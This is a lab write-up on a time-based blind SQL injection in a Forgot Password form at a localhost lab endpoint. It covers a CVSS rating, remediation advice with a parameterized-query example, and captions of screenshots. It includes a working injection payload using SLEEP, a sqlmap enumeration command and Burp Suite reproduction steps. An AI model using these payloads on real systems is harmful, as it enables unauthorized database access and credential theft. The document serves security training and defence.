# Time-Based Blind SQL Injection

### Vulnerability : Time-Based Blind SQL Injection

#### 1. Vulnerability Name & Description

**Challenge Name:** Time-Based Blind SQL Injection

**Vulnerability Type:** SQL Injection – Time-Based Blind (POST)

The application’s **Forgot Password** functionality processes user-supplied email input without proper input sanitization or parameterized queries.

This allows an attacker to inject time-delay SQL payloads that cause the database to intentionally delay responses, confirming SQL injection without returning visible errors or data.

The vulnerability exists in a **POST parameter**, making it harder to detect manually but fully exploitable using automated tools such as **sqlmap**.

***

#### 2. Proof of Concept (PoC)

**Vulnerable Endpoint:**

```
POST <http://localhost:1337/lab/sql-injection/post-blind-time/>
```

**Vulnerable Parameter:**

```
email (POST)
```

**Manual Payload Example:**

```sql
test@gmail.com' AND SLEEP(5)-- -
```

**Automated Exploitation Command (sqlmap):**

```bash
sqlmap -r /ctf/sql.txt --batch --dbs
```

#### Steps to Reproduce:

1. Navigate to the **Forgot Password** page
2. Enter a normal email and submit the form
3. Intercept the POST request using Burp Suite
4. Save the request to a file (`sql.txt`)
5. Execute sqlmap with the saved request
6. Observe delayed responses confirming time-based injection
7. Enumerate databases successfully

***

#### 3. Impact Analysis

* Complete database enumeration without visible errors
* Extraction of database names, tables, and sensitive data
* Credential harvesting from user tables
* Authentication bypass possibilities
* Full compromise of backend database
* Severe risk if combined with privilege escalation or RCE chains

***

#### 4. CVSS 3.1 Score & Vector String

**CVSS Base Score:** **8.6 (High)**

**Vector String:**

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
```

***

#### 5. Risk Rating / Severity

**Severity Level:** **HIGH**

Time-Based Blind SQL Injection is highly dangerous because it allows full database compromise even when no error messages or output are displayed, making detection difficult for defenders.

***

#### 6. Remediation / Mitigation Steps

1. Use **prepared statements / parameterized queries**
2. Never concatenate user input directly into SQL queries
3. Validate and sanitize all POST parameters
4. Implement ORM frameworks with built-in protections
5. Apply least-privilege permissions to database users
6. Enable database query logging and anomaly detection

**Secure Example (PHP PDO):**

```php
$stmt =$pdo->prepare("SELECT * FROM users WHERE email = ?");
$stmt->execute([$email]);
```

***

#### 7. Screenshots / Logs / Payloads

<figure><img src="../../../.gitbook/assets/image (281).png" alt=""><figcaption></figcaption></figure>

* Forgot Password form submission

<figure><img src="../../../.gitbook/assets/image (282).png" alt=""><figcaption></figcaption></figure>

* Burp Suite intercepted POST request
* Saved request file `(sql.txt)`

<figure><img src="../../../.gitbook/assets/image (283).png" alt=""><figcaption></figcaption></figure>

* sqlmap time-based blind detection
* Enumerated databases:
  * `information_schema`
  * `mysql`
  * `performance_schema`
  * `sql_injection`

